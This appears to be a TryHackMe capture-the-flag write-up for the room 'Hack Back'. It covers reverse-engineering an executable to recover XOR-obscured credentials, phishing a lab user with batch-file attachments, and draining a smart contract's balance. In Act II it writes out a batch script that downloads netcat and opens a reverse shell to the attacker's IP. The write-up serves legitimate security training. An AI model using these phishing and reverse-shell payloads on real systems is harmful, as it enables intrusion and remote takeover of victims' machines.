---
title: "TryHackMe: Hack Back"
author: jaxafed
categories: [TryHackMe]
tags: [reverse engineering, ghidra, phishing, nc, blockchain, smart contract]
render_with_liquid: false
media_subpath: /images/tryhackme_hack_back/
image:
  path: room_image.webp
---

**Hack Back** started with reverse-engineering an executable file to discover an email address and a password. After that, we used these credentials to send a phishing email and obtain a shell. Lastly, we completed the room by hacking a smart contract.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/hackback){: .center }

## Act I

We start with **ACT I**, where we are tasked with investigating a suspicious file to recover an email address and a password. For this, we are provided with credentials for a Windows machine.

Using **RDP** to get a session on the machine, we locate the suspicious file at `C:\Users\Administrator\simpleServer.exe`, along with a batch script that runs it.

![Act1 Suspicious File](act1_suspicious_file.webp){: width="1200" height="900" }

To transfer the executable to our machine, we start an **SMB** server using `impacket-smbserver`.

```console
$ impacket-smbserver share . -smb2support -user jxf -pass jxf
```

After that, we copy the executable from the target to our share.

```
C:\Users\Administrator>net use \\10.11.72.22\share /user:jxf jxf
The command completed successfully.


C:\Users\Administrator>copy simpleServer.exe \\10.11.72.22\share\simpleServer.exe
        1 file(s) copied.
```

Opening the executable in **Ghidra**, we find the main function as `FUN_140001b10`.

Examining it, we see that it binds to port `1337` on all interfaces, waits to receive a connection, and when it receives a connection, it reads a command from it, prints it, and then calls `FUN_140001980` with the received command.

![Act1 Suspicious File Ghidra One](act1_suspicious_file_ghidra1.webp){: width="600" height="400" }

In the `FUN_140001980` function, we see a switch case for all the available commands received.

![Act1 Suspicious File Ghidra Two](act1_suspicious_file_ghidra2.webp){: width="600" height="400" }

Since we are after an email address, let's check the `FUN_1400017e0` function to see what the application does when it receives the `email` command.

First, we see it calling the `FUN_140001640` function with two strings: `` g`ww|g`dwv+ljf `` and `` umlvm`wEg`ww|g`dwv+ljf ``.

![Act1 Suspicious File Ghidra Three](act1_suspicious_file_ghidra3.webp){: width="600" height="300" }

In the `FUN_140001640` function, we see that it simply XOR decrypts the passed string using `0x05` as the key and returns the result.

![Act1 Suspicious File Ghidra Four](act1_suspicious_file_ghidra4.webp){: width="600" height="400" }

Decrypting the strings passed to the function in the same way using `Python`, we are able to obtain a domain name along with an email address.

```console
$ python3
>>> from pwn import xor
>>> xor(b"g`ww|g`dwv+ljf", b"\x05")
b'berrybears.ioc'
>>> xor(b"umlvm`wEg`ww|g`dwv+ljf", b"\x05")
b'phisher@berrybears.ioc'
```

Now, going back to the `FUN_1400017e0` function, after decrypting the domain name and email address, we see it first calling the `FUN_1400012c0` function with the decrypted `domain name`, `143`, and the decrypted `email address`. After that, it calls the same function again, with the only difference being that the third parameter is `4hQm6I66qME}5w$` instead of the email address.

![Act1 Suspicious File Ghidra Three](act1_suspicious_file_ghidra3.webp){: width="600" height="300" }

In the `FUN_1400012c0` function, we see that it simply connects to the domain passed as the first argument on the port specified in the second argument and sends the data passed in the third argument.

![Act1 Suspicious File Ghidra Five](act1_suspicious_file_ghidra5.webp){: width="600" height="600" }

If we add `berrybears.ioc` to the `C:\Windows\System32\drivers\etc\hosts` file on the target to resolve to our machine's IP address, then run `simpleServer.exe` and send the `email` command, we can observe this functionality in action as follows:

```console
$ ncat -lvnkp 143
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:143
Ncat: Listening on 0.0.0.0:143
Ncat: Connection from 10.10.199.18:49848.
phisher@berrybears.ioc
Ncat: Connection from 10.10.199.18:49849.
4hQm6I66qME}5w$
```

At this point, we have the email address; however, we are still missing the password, as `4hQm6I66qME}5w$` is not accepted. We also observed that both the domain name and the email were **XOR**'ed with `0x05` before being used, while the `4hQm6I66qME}5w$` string was not. So, we try **XOR**'ing it the same way as the other strings, which works, and we discover the password, completing **ACT I**.

```console
>>> xor(b"4hQm6I66qME}5w$", b"\x05")
b'1mTh3L33tH@x0r!'
```

## Act II

We begin the second act with an `nmap` scan against the target.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.53.24
...
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
...
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
...
110/tcp   open  pop3          hMailServer pop3d
...
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
...
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
...
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
...
3306/tcp  open  mysql         MySQL 5.5.5-10.4.24-MariaDB
...
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
...
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: FISHER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

While there are many ports open, the important ones are:

- **25** (`SMTP`)
- **80** (`HTTP`)
- **110** (`POP3`)
- **139**/**445** (`SMB`)
- **143** (`IMAP`)
- **443** (`HTTPS`)
- **547** (`SMTPS`)
- **3306** (`MYSQL`)
- **3389** (`RDP`)
- **5985** (`WINRM`)

Visiting the HTTP server at `http://10.10.53.24/`, we encounter a page displaying a ransomware note.

![Act2 Web 80 Index](act2_web_80_index.webp){: width="1200" height="800" }

Fuzzing the web server for directories, we discover two interesting ones: `/mail` and `/rc`.

```console
$ ffuf -u 'http://10.10.53.24/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
mail                    [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 149ms]
rc                      [Status: 301, Size: 332, Words: 22, Lines: 10, Duration: 223ms]
```
{: .wrap }

At `http://10.10.53.24/mail/`, we find a **RainLoop** installation.

![Act2 Web 80 Rainloop](act2_web_80_rainloop.webp){: width="1200" height="800" }

And at `http://10.10.53.24/rc/`, we find a **Roundcube** installation.

![Act2 Web 80 Roundcube](act2_web_80_roundcube.webp){: width="1200" height="800" }

From the previous task, we already have an email address and a password. We can choose either of the webmail applications to log in with those credentials to read the user's mail.

After logging in, we find a single email from `boss@berrybears.ioc`, asking for a key.

![Act2 Web 80 Roundcube Mail One](act2_web_80_roundcube_mail1.webp){: width="1200" height="800" }

Interestingly, if we send an email to the `boss@berrybears.ioc` user, we receive a reply shortly afterward stating that they did not find the key.

![Act2 Web 80 Roundcube Mail Two](act2_web_80_roundcube_mail2.webp){: width="1200" height="800" }

Next, if we send an email with an attachment, we receive a reply saying, "Let me have a look!".

![Act2 Web 80 Roundcube Mail Three](act2_web_80_roundcube_mail3.webp){: width="1200" height="800" }

So, the `boss@berrybears.ioc` might be downloading and running our attachments. We can test this by simply sending a batch script that makes a request to our server.

First, we create our batch script as follows:

```batch
@echo off
powershell curl http://10.11.72.22/test
```
{: file="test.bat" }

Now, after sending an email with the batch script as an attachment, we see a hit on our web server after some time, confirming that the user ran our attachment.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.53.24 - - [10/Nov/2024 04:29:12] code 404, message File not found
10.10.53.24 - - [10/Nov/2024 04:29:12] "GET /test HTTP/1.1" 404 -
```

To get a reverse shell using this method, we can simply create another batch script that downloads `netcat` to the machine and uses it to send a shell to our machine.

```batch
@echo off
powershell curl http://10.11.72.22/nc64.exe -o C:\Windows\Temp\nc64.exe
C:\Windows\Temp\nc64.exe 10.11.72.22 443 -e cmd
```
{: file="rev.bat" }

Once again, we send another email, this time attaching the `rev.bat` file.

After some time, we see a request made to our web server for `nc64.exe`.

```console
10.10.53.24 - - [10/Nov/2024 04:34:07] "GET /nc64.exe HTTP/1.1" 200 -
```

And we get a shell in our listener as `Administrator` and can read the flag at `C:\Users\Administrator\Desktop\root.txt`.

```console
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.53.24] 50188
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
fisher\administrator

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{[REDACTED]}
```

## Act III

For the final act, we are tasked with hacking a smart contract.

Visiting `http://10.10.15.184/`, we find the source code for the contract along with all the information needed to interact with it.

![Act3 Web 80 Index](act3_web_80_index.webp){: width="1200" height="800" }

The contract is fairly simple. When it is deployed, it sets the balance for the address that deployed the contract to **1000** and to solve the challenge, we need to make the balance for the owner equal to **0**.

```javascript
contract Challenge {
    mapping(address => uint256) public balances;
    bool public you_solved_it = false;
    address public owner;

    constructor() {
        owner = msg.sender;
        balances[owner] = 1000;
    }
...
    function isSolved() external view returns (bool) {
         //return you_solved_it;
         return (balances[owner] == 0);
    }

}
```

To achieve this goal, we can utilize the `transfer` function, which transfers the amount specified by the `amount` parameter from the owner's balance to the one calling the function.

However, there is one caveat: the `if (keccak256(abi.encodePacked("ZI^ZI^U_MJI")) == keccak256(decode(strBytes, 44)))` check.

This check hashes the string `ZI^ZI^U_MJI` and compares it to the hash of the return value from the `decode` function, which is called with the user-passed `data` argument (converted to bytes) and `44` as the second argument.

```javascript
function transfer(string memory data, uint256 amount) external returns (bool out) {
    
    bytes memory strBytes = bytes(data);
    if (keccak256(abi.encodePacked("ZI^ZI^U_MJI")) == keccak256(decode(strBytes, 44))) {
        you_solved_it = true;
        require(balances[owner] >= amount, "Insufficient balance");
        balances[owner] -= amount;
        balances[msg.sender] += amount;
        return true;
    }
    return false;
}
```

Checking the `decode` function, we see it perform a `XOR` operation on the first argument passed using the second argument as the key and returns the result.

```javascript
function decode(bytes memory data, uint8 key) public pure returns (bytes memory) {
    bytes memory result = new bytes(data.length);
    for (uint256 i = 0; i < data.length; i++) {
        result[i] = bytes1(uint8(data[i]) ^ key);
    }
    return result;
}
```

To pass this check, all we need to do is call the `transfer` function with a `data` argument equal to `ZI^ZI^U_MJI` after being **XOR**'ed with `44`. Since the **XOR** operation is reversible, we can find this value as `ververysafe` by **XOR**'ing `ZI^ZI^U_MJI` with `44`.

```console
$ python3
>>> from pwn import xor
>>> xor(b"ZI^ZI^U_MJI", int.to_bytes(44))
b'ververysafe'
```

Now, to solve the challenge, all we need to do is call the `transfer` function with `ververysafe` as the first argument to pass the check, and `1000` as the second argument to make the owner's balance `0`.

We can use the `cast` tool from the `Foundry` framework to do this as follows:

```console
$ cast send --legacy --rpc-url http://10.10.15.184:8545 --private-key 0x58265bb40a901122e46b9ab474b0a05988370be16c564820f647c6fdc6de4af6  0xf22cB0Ca047e88AC996c17683Cee290518093574 'transfer(string memory data, uint256 amount)' 'ververysafe' 1000
```
{: .wrap }

After this, we return to `http://10.10.15.184/` and click the `Get Flag` button to receive the flag for the challenge and complete the room.

![Act3 Web 80 Flag](act3_web_80_flag.webp){: width="1200" height="800" }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>